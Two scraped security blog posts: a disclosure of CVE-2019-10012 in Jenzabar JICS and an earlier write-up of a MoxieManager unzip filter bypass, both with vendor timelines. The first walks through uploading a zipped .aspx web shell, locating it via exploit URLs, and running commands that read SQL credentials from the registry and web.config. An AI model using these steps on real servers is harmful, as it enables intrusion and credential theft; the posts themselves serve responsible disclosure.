=== Content from medium.com_f40b02aa_20250120_232718.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F55580f8880c&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40mdavis332%2Fcritical-vulnerability-in-higher-ed-erp-55580f8880c&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40mdavis332%2Fcritical-vulnerability-in-higher-ed-erp-55580f8880c&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Critical vulnerability in Higher Ed ERP

[![Michael Davis](https://miro.medium.com/v2/resize:fill:88:88/0*60bPY_NnoblLQxy3.jpg)](/%40mdavis332?source=post_page---byline--55580f8880c--------------------------------)

[Michael Davis](/%40mdavis332?source=post_page---byline--55580f8880c--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fb6657ab2e311&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40mdavis332%2Fcritical-vulnerability-in-higher-ed-erp-55580f8880c&user=Michael+Davis&userId=b6657ab2e311&source=post_page-b6657ab2e311--byline--55580f8880c---------------------post_header-----------)

3 min read·Oct 30, 2018

--

Listen

Share

**CVE-2019–10012**
tl;dr: Critical vulnerability in Jenzabar JICS <9.x, a Higher Ed ERP used by numerous small-to-medium sized colleges/universities, has a trivially exploitable plugin that allows remote privilege escalation to a web shell.

# Part I

On Friday, October 19, I uncovered a severe vulnerability while playing around in the portal, JICS (Jenzabar Internet Campus Solutions), for the ERP (/ Student Information System) used by the university where I work. I had been reading about weaknesses exposed by web-based file upload mechanisms and I wanted to explore such options in our ERP/SIS.

Indeed, JICS versions prior to 9.x use one such plugin within visual text box editors to allow file and image upload/insertion into the form. These forms with the file upload toolbar can be exposed to any user, including unauthenticated ones. However, in my testing it seems that only authenticated users can use the upload button. That’s the good news. The bad news is that least-privileged users such as prospective students can use the toolbar plugin to upload web shells and exploit the vulnerability.

Once I discovered the issue, I reported it through Jenzabar’s generic website contact info Friday night. Monday morning at 9:30am CDT I still hadn’t heard back, so my CIO used his contacts at Jenzabar to email their development team. We got an immediate response and I was put in touch with the lead developer for their portal software who asked me to detail the steps to reproduce the issue. I provided those steps via email.

By 6pm CDT I got an email back from Jenzabar’s VP over the product development team who acknowledged the issue, reported that they could reproduce it, and were working on a fix and communication plan to their customer base. At 4:30pm the next day (Tuesday), they sent out an email to their customer mailing list with a patch to mitigate the issue. Below I thought I’d detail my thought process for how I exploited the problem.

Edit: Within the week I discovered that the initial vendor patch did not completely mitigate this issue. [Part II](/%40mdavis332/critical-vulnerability-in-higher-ed-erp-pt-ii-f39de368879c) has been released.

* Downloaded .aspx web shell and tried to upload to MoxieManager in SIS portal but wouldn’t take aspx file
* Zipped shell.aspx into shell.zip and uploaded it to MoxieManager
* MoxieManager includes unzip function in the web file manager. Unzipped shell.zip. File viewer didn’t show it, but I could tell it was there due to website behavior

![]()

shell.aspx is unzipped, but file viewer doesn’t show it

* Needed to figure out the URL path to where my aspx lived
* Got the relative path by looking at info in file browser of moxman. Also found links in the source to the following, so I tried going to them in the address bar:

```
https://my.domain.edu/ICS/staticpages/getfile.aspx?target=/moxiemanager/files/users/30a1d7b9-3fd2-4801-9c52-268977a4a558/shell.ziphttps://my.domain.edu/ICS/staticpages/getfile.aspx?target=/moxiemanager/files/users/30a1d7b9-3fd2-4801-9c52-268977a4a558/shell.aspxhttps://my.domain.edu/ICS/UI/Common/Scripts/tinymce/plugins/moxiemanager/api.ashx?action=download&path=%2Fusername%2Fshell.aspx
```

* Kept downloading rather than running the active server page. Need to find the full URL path where it was uploaded
* Ok, stop trying file paths. Let’s try a dir and see what happens…

```
https://my.domain.edu/ICS/staticpages/getfile.aspx?target=/moxiemanager/files/users/30a1d7b9-3fd2-4801-9c52-268977a4a558
```

* Produced an IIS error which was …

> Could not find file ‘D:\Program Files\ICS\ICS.NET\ICSFileServer/moxiemanager/files/users/30a1d7b9–3fd2–4801–9c52–268977a4a558’

* Which gave the literal path…

```
https://my.domain.edu/ICSFileServer/moxiemanager/files/users/30a1d7b9-3fd2-4801-9c52-268977a4a558/shell.aspx
```

* Which finally led to execution of my intact web shell. Logged in and looked around…

`gci hklm:\software\odbc\odbc.ini` gives username/password for sql connections.
`cat ‘d:\program files\ICS\ICS.net\portal\web.config’` to get sql connection string user/password

* Now it’s all over. I can use sql connection string from webshell to connect to database and read/write everything that the sql user can
* Also now trivial to setup listener on the host so I can snag usernames/passwords or setup a reverse shell
# Sources

Turns out this was related to an issue in the Moxie Manager plugin that others had discovered, reported, and had been fixed back in 2016 within the Moxie Manager code: <https://www.sjoerdlangkemper.nl/2016/09/15/uploading-webshells-with-moxiemanager/>

Jenzabar had included the newer (fixed) Moxie Manager plugin in their latest portal software (≥9.x), but had been heretofore unaware of the issue to backport fixes for customers still on previous versions.

Read [Part II](/%40mdavis332/critical-vulnerability-in-higher-ed-erp-pt-ii-f39de368879c) about how I bypassed the initial vendor patch.

2019-Mar-24: CVE-2019–10012 issued for this vulnerability

[Moxie Manager](/tag/moxie-manager?source=post_page-----55580f8880c--------------------------------)[Infosec](/tag/infosec?source=post_page-----55580f8880c--------------------------------)[Redteam](/tag/redteam?source=post_page-----55580f8880c--------------------------------)[Security](/tag/security?source=post_page-----55580f8880c--------------------------------)[Information Security](/tag/information-security?source=post_page-----55580f8880c--------------------------------)

--

--

[![Michael Davis](https://miro.medium.com/v2/resize:fill:96:96/0*60bPY_NnoblLQxy3.jpg)](/%40mdavis332?source=post_page---post_author_info--55580f8880c--------------------------------)[![Michael Davis](https://miro.medium.com/v2/resize:fill:128:128/0*60bPY_NnoblLQxy3.jpg)](/%40mdavis332?source=post_page---post_author_info--55580f8880c--------------------------------)Follow[## Written by Michael Davis](/%40mdavis332?source=post_page---post_author_info--55580f8880c--------------------------------)[10 Followers](/%40mdavis332/followers?source=post_page---post_author_info--55580f8880c--------------------------------)·[4 Following](/%40mdavis332/following?source=post_page---post_author_info--55580f8880c--------------------------------)

Working InfoSec in F500 with interests in System Design, Cyber Threat Intelligence, and Detections.

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----55580f8880c--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----55580f8880c--------------------------------)[About](/about?autoplay=1&source=post_page-----55580f8880c--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----55580f8880c--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----55580f8880c--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----55580f8880c--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----55580f8880c--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----55580f8880c--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----55580f8880c--------------------------------)[Teams](/business?source=post_page-----55580f8880c--------------------------------)



=== Content from www.sjoerdlangkemper.nl_161fb6d7_20250120_232718.html ===

[Sjoerd Langkemper](/)
Web application security

# Uploading webshells using .NET MoxieManager

Sep 15, 2016

MoxieManager is a file manager for web applications. By using the built-in unzip functionality we can bypass the file extension filter in the .NET version of MoxieManager.

## Bypassing the file extension restrictions with unzip

MoxieManager allows only files with certain file extensions to be uploaded. Uploading a JPG is allowed, but an ASPX is not. MoxieManager also has functionality to zip and unzip files. This is useful when uploading or downloading a large amount of files. By using the unzip functionality, we can bypass the file extension filter and upload files with any extension we want.

This only works in the .NET version of MoxieManager, not in the PHP version. I tested MoxieManager for .NET version 1.1, released in 2013. MoxieManager will not show the file in the interface, but the file will still be accessible if uploaded within the webroot.

Upload a zip file and extract it:

![Unzip webshell.zip](/images/moxiemanager-unzip-mywebshell.png)

And open the webshell to run anything on the server:

![Resulting webshell](/images/moxiemanager-run-mywebshell.png)

## Why does this happen

First I assumed that MoxieManager simply ignores the extension filter and calls `unzip.exe mywebshell.zip`, but this is not the case. Both in the PHP as in the .NET version each file in the zip-file is checked against the filter. The following examples are obtained by disassembling the .NET DLLs using [dotPeek](https://www.jetbrains.com/decompiler/):

```
BasicFileFilter fileFilter = BasicFileFilter.CreateFromConfig(config);
foreach (ZipArchiveEntry entry in new ZipArchive(...).Entries)
{
    IFile file = FileSystemManager.GetFile(PathUtils.Combine(destinationDir.Path, entry.FullName));
    if (!file.Exists && fileFilter.Accept(file))
    {
        // Write file
    }
}

```

As you can see the BasicFilterFilter is consulted for every file in the zip. Its job is to check the extension of each file, but it doesnât. It doesnât even consider them files to begin with:

```
public LocalFile(FileSystem fileSystem, string path)
{
    this.fileInfo = new FileInfo(PathUtils.ToSystemPath(path));
    if (this.fileInfo.Exists) {
        return;
    }
    this.dirInfo = new DirectoryInfo(PathUtils.ToSystemPath(path));
    this.fileInfo = (FileInfo) null;
}

public bool IsFile()
{
    return this.fileInfo != null;
}

```

The constructor for this file class assumes that anything in the filesystem is either a file or a directory. If it isnât an existing file, then it must be a directory. This does not hold up for files that do not exist yet, such as those we are extracting from a zip-file. These get marked as a directory, and the BasicFileFilter will not do any extension checking on them because that makes no sense for directories.

## Disabling zip upload doesnât work

To protect against this vulnerability, you may think that blocking zip-files from being uploaded solves this problem. However, MoxieManager will also happily unzips files with any other extension. By renaming a zip-file to image.jpg and invoking the unzip-command on it, an attacker could still upload arbitrary files.

## Conclusion

Because different components make different assumptions on files, it is possible to upload web shells using MoxieManager. According to Ephox this issue will be fixed in version 2.1.4, to be released in October 2016.

## Timeline

* 15 June 2016, Sjoerd â Ephox: found this vulnerability.
* 15 June 2016, Ephox â Sjoerd: when can we contact you about your editor requirements?
* 20 June 2016, Ephox â Sjoerd: you can configure MoxieManager to upload ASPX files
* 23 June 2016, Ephox â Sjoerd: how many servers are you planning on deploying TinyMCE on?
* 23 June 2016, Sjoerd â Ephox: no, I have found a vulnerability.
* 23 June 2016, Ephox â Sjoerd: thanks, weâll look into it.
* 07 July 2016, Sjoerd â Ephox: any update?
* 07 July 2016, Ephox â Sjoerd: weâre working on it. Which version did you use?
* 08 July 2016, Sjoerd â Ephox: this version.
* 30 August 2016, Sjoerd â Ephox: any update?
* 13 September 2016, Sjoerd â Ephox: any update?
* 16 September 2016, Ephox â Sjoerd: sorry it took so long. The issue will be fixed in the next release.

![Sjoerd Langkemper](/images/sjoerd-langkemper-480.webp)
![email](/images/email.svg)[![StackOverflow](/images/stackoverflow.svg)](https://stackoverflow.com/users/182971/sjoerd)[![GitHub](/images/github.svg)](https://github.com/Sjord)[![LinkedIn](/images/linkedin.svg)](https://nl.linkedin.com/in/sjoerd-langkemper-86075246)[![RSS](/images/rss.svg)](/feed.xml)

[« XSS in Kayako helpdesk software](/2016/08/29/kayako-xss/)
[Attacking JWT authentication »](/2016/09/28/attacking-jwt-authentication/)

You can find more posts on the [homepage](/).


